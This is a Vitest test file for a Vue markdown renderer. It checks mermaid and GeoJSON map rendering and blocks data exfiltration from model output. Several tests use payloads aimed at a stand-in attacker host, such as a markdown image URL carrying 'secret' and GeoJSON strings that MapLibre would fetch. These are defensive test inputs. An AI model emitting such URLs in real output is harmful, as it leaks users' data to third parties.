import { describe, it, expect, vi } from 'vitest'
import { mount } from '@vue/test-utils'
import MarkdownRenderer, { parseGeoJSON } from '@/components/MarkdownRenderer.vue'

// Mock maplibre-gl: record every Map so tests can inspect what reached addSource.
// 'load' handlers fire immediately so the source/layers are added synchronously.
const maplibreState = vi.hoisted(() => ({ maps: [] }))
vi.mock('maplibre-gl', () => {
    class FakeMap {
        constructor(options) {
            this.options = options
            this.addSource = vi.fn()
            this.addLayer = vi.fn()
            this.addControl = vi.fn()
            this.flyTo = vi.fn()
            this.fitBounds = vi.fn()
            this.remove = vi.fn()
            maplibreState.maps.push(this)
        }
        on(event, layerOrHandler, handler) {
            if (event === 'load' && typeof layerOrHandler === 'function') layerOrHandler()
            return this
        }
    }
    class LngLatBounds {
        extend() { return this }
    }
    return {
        default: {
            Map: FakeMap,
            LngLatBounds,
            AttributionControl: class {},
            NavigationControl: class {},
            Popup: class {},
        },
    }
})

// Mock mermaid
vi.mock('mermaid', () => ({
    default: {
        initialize: vi.fn(),
        run: vi.fn().mockResolvedValue(undefined),
    }
}))

// Mock vue-markdown-render to render the source directly
vi.mock('vue-markdown-render', () => ({
    default: {
        name: 'VueMarkdown',
        props: ['source', 'plugins'],
        setup(props) {
            // Simulate the plugin processing for mermaid blocks
            let processedSource = props.source || ''
            processedSource = processedSource.replace(/```geojson\n([\s\S]*?)\n```/g,
                (_, body) => `<div class="geojson-map" data-geojson="${encodeURIComponent(body.trim())}"></div>`)
            if (processedSource.includes('```mermaid')) {
                processedSource = processedSource.replace(/```mermaid\n?([\s\S]*?)\n?```/g, '<div class="mermaid">$1</div>')
            }
            return { processedSource }
        },
        template: '<div class="vue-markdown-stub" v-html="processedSource"></div>'
    }
}))

describe('MarkdownRenderer', () => {
    it('renders with source prop', () => {
        const wrapper = mount(MarkdownRenderer, {
            props: { source: 'Hello **world**' }
        })
        expect(wrapper.find('.markdown-renderer').exists()).toBe(true)
        expect(wrapper.text()).toContain('Hello')
    })

    it('passes geojson and mermaid plugins to vue-markdown', () => {
        const wrapper = mount(MarkdownRenderer, {
            props: { source: 'test content' }
        })
        const vueMarkdown = wrapper.findComponent({ name: 'VueMarkdown' })
        expect(vueMarkdown.exists()).toBe(true)
        const plugins = vueMarkdown.props('plugins')
        expect(plugins).toHaveLength(2)
        plugins.forEach(p => expect(typeof p).toBe('function'))
    })

    it('initializes mermaid on mount', async () => {
        const mermaid = (await import('mermaid')).default
        mount(MarkdownRenderer, {
            props: { source: '```mermaid\ngraph TD\nA-->B\n```' }
        })
        // wait for nextTick and lazy load
        await new Promise(resolve => setTimeout(resolve, 350))

        expect(mermaid.initialize).toHaveBeenCalled()
    })

    it('mermaidPlugin replaces mermaid fence with div', () => {
        // Manually test the plugin logic. The mermaid plugin is the second one
        // installed (the first is the geojson plugin) and it must run last so
        // its fence rule wraps the geojson rule's output.
        const wrapper = mount(MarkdownRenderer, {
            props: { source: 'test' }
        })

        const vueMarkdown = wrapper.findComponent({ name: 'VueMarkdown' })
        const plugins = vueMarkdown.props('plugins')

        // Create a mock markdown-it instance and run all plugins in order
        const md = {
            renderer: { rules: {} },
            utils: { escapeHtml: (s) => s }
        }
        plugins.forEach(p => p(md))

        // Verify the fence rule was set by the chain
        expect(typeof md.renderer.rules.fence).toBe('function')

        // Test mermaid fence rendering — should be handled by the mermaid plugin
        const tokens = [{
            info: 'mermaid',
            content: 'graph TD\n  A-->B'
        }]
        const result = md.renderer.rules.fence(tokens, 0, {}, {}, { renderToken: () => '' })
        expect(result).toContain('<div class="mermaid">')
        expect(result).toContain('graph TD')

        // Test non-mermaid, non-geojson fence falls through to the default renderer
        const jsTokens = [{
            info: 'javascript',
            content: 'console.log("hi")'
        }]
        const jsResult = md.renderer.rules.fence(jsTokens, 0, {}, {}, { renderToken: () => '<code>fallback</code>' })
        expect(jsResult).toBe('<code>fallback</code>')
    })

    it('uses default empty string for source', () => {
        const wrapper = mount(MarkdownRenderer, {
            props: {}
        })
        const vueMarkdown = wrapper.findComponent({ name: 'VueMarkdown' })
        expect(vueMarkdown.props('source')).toBe('')
    })

    it('disables markdown images when allowImages is false (model output)', async () => {
        const MarkdownIt = (await import('markdown-it')).default
        const wrapper = mount(MarkdownRenderer, {
            props: { source: 'x', allowImages: false }
        })
        const plugins = wrapper.findComponent({ name: 'VueMarkdown' }).props('plugins')

        const md = new MarkdownIt()
        plugins.forEach(plugin => md.use(plugin))
        const html = md.render('![leak](https://attacker.example/?q=secret)')

        expect(html).not.toContain('<img')
        expect(html).not.toContain('src="https://attacker.example')
    })

    it('keeps images by default', async () => {
        const MarkdownIt = (await import('markdown-it')).default
        const wrapper = mount(MarkdownRenderer, { props: { source: 'x' } })
        const plugins = wrapper.findComponent({ name: 'VueMarkdown' }).props('plugins')

        const md = new MarkdownIt()
        plugins.forEach(plugin => md.use(plugin))

        expect(md.render('![pic](https://example.com/a.png)')).toContain('<img')
    })

    describe('geojson maps', () => {
        const flush = () => new Promise(resolve => setTimeout(resolve, 20))

        it('never passes a string payload to addSource (MapLibre would fetch it as a URL)', async () => {
            maplibreState.maps.length = 0
            const wrapper = mount(MarkdownRenderer, {
                props: {
                    source: '```geojson\n"https://attacker.example/?d=secret"\n```',
                    allowImages: false,
                },
            })
            await flush()

            maplibreState.maps.forEach(map => expect(map.addSource).not.toHaveBeenCalled())
            expect(maplibreState.maps).toHaveLength(0)
            expect(wrapper.html()).toContain('Invalid GeoJSON')
        })

        it('still renders a valid FeatureCollection', async () => {
            maplibreState.maps.length = 0
            const fc = {
                type: 'FeatureCollection',
                features: [
                    { type: 'Feature', geometry: { type: 'Point', coordinates: [-2.1, 54.1] }, properties: { name: 'A' } },
                    { type: 'Feature', geometry: { type: 'Point', coordinates: [-2.2, 54.2] }, properties: { name: 'B' } },
                ],
            }
            mount(MarkdownRenderer, {
                props: { source: '```geojson\n' + JSON.stringify(fc) + '\n```', allowImages: false },
            })
            await flush()

            expect(maplibreState.maps).toHaveLength(1)
            const map = maplibreState.maps[0]
            expect(map.addSource).toHaveBeenCalledWith('pip-data', { type: 'geojson', data: fc })
            // The style URL is a fixed constant, never taken from content.
            expect(map.options.style).toMatch(/^https:\/\/api\.maptiler\.com\//)
        })

        it.each([
            ['a URL string', '"https://attacker.example/x"'],
            ['a number', '42'],
            ['null', 'null'],
            ['an array', '["https://attacker.example/x"]'],
            ['an object without a GeoJSON type', '{"type":"https://attacker.example/x"}'],
            ['an object with no type', '{"data":"https://attacker.example/x"}'],
            ['a FeatureCollection with URL features', '{"type":"FeatureCollection","features":"https://attacker.example/x"}'],
            ['a Feature with a string geometry', '{"type":"Feature","geometry":"https://attacker.example/x"}'],
            ['invalid JSON', '{not json'],
        ])('parseGeoJSON rejects %s', (_, raw) => {
            expect(parseGeoJSON(raw)).toBeNull()
        })

        it.each([
            'FeatureCollection', 'Feature', 'Point', 'MultiPoint', 'LineString',
            'MultiLineString', 'Polygon', 'MultiPolygon', 'GeometryCollection',
        ])('parseGeoJSON accepts type %s', (type) => {
            const value = type === 'FeatureCollection'
                ? { type, features: [] }
                : type === 'Feature' ? { type, geometry: null, properties: {} } : { type, coordinates: [] }
            expect(parseGeoJSON(JSON.stringify(value))).toEqual(value)
        })
    })
})
